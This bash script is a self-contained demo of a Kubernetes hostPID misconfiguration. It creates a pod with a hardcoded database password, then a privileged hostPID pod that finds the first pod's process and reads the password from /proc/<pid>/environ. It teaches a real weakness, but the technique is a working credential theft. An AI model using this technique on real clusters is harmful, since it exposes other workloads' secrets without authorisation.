#!/usr/bin/env bash
set -euo pipefail

# Colors for terminal output
RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
NC="\033[0m" # No Color

# Cleanup function to handle pod removal
cleanup() {
    echo -e "\n${CYAN}Cleaning up Kubernetes resources...${NC}"
    kubectl delete pod target-app inspector-pod --force --grace-period=0 --ignore-not-found=true >/dev/null 2>&1
    echo -e "${GREEN}Cleanup complete.${NC}"
}

# Register trap for automatic cleanup on exit or Ctrl+C
trap cleanup EXIT SIGINT

echo -e "${CYAN}====================================================${NC}"
echo -e "${CYAN}   Kubernetes hostPID Misconfiguration Demo         ${NC}"
echo -e "${CYAN}====================================================${NC}\n"

# Step 1: Deploy Target Application with a secret environment variable
echo -e "${CYAN}Step 1: Deploying target application pod with sensitive env variable...${NC}"
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: target-app
spec:
  containers:
  - name: target-app
    image: alpine:latest
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    env:
    - name: DB_PASSWORD
      value: "SuperSecretPassword123!"
EOF

echo -e "${CYAN}Waiting for target-app to be ready...${NC}"
kubectl wait --for=condition=Ready pod/target-app --timeout=60s

# Step 2: Deploy Inspector Pod using hostPID and privileged mode
echo -e "\n${CYAN}Step 2: Deploying inspector pod with hostPID: true...${NC}"
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: inspector-pod
spec:
  hostPID: true
  containers:
  - name: inspector
    image: alpine:latest
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
EOF

echo -e "${CYAN}Waiting for inspector-pod to be ready...${NC}"
kubectl wait --for=condition=Ready pod/inspector-pod --timeout=60s

# Step 3: Inspect process memory via host PID namespace
echo -e "\n${CYAN}Step 3: Demonstrating process and environment variable leakage...${NC}"

TARGET_PID=$(kubectl exec inspector-pod -- /bin/sh -c "ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \$1}' | head -n 1")

if [ -n "$TARGET_PID" ]; then
    echo -e "${GREEN}Found target process on host PID: ${TARGET_PID}${NC}"
    echo -e "${CYAN}Extracting secret from /proc/${TARGET_PID}/environ via inspector-pod:${NC}\n"
    
    # Read environment variables directly from procfs
    kubectl exec inspector-pod -- /bin/sh -c "cat /proc/${TARGET_PID}/environ | tr '\0' '\n' | grep DB_PASSWORD" || true
else
    echo -e "${RED}Could not locate target process PID.${NC}"
fi

echo -e "\n${CYAN}Demo finished. Triggering cleanup...${NC}"
